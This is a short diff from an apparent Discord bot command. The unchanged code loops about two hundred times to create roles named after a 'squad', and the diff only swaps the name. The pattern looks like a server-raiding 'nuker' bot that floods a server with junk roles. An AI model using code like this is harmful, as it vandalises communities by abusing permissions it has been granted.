@@ -29,9 +29,9 @@ try{
     });
     for (let i = 0; i <= 200; i++) {
         interaction.guild.roles.create({
-            name: '☣️BasadoSquad☣️',
+            name: '☣️ⱠegiønSquad☣️',
             color: 'RED',
-            reason: '☣️BasadoSquad☣️',
+            reason: '☣️ⱠegiønSquad☣️',
             position: interaction.guild.me.roles.highest.position - 1
         }).catch(()=>{
             return;
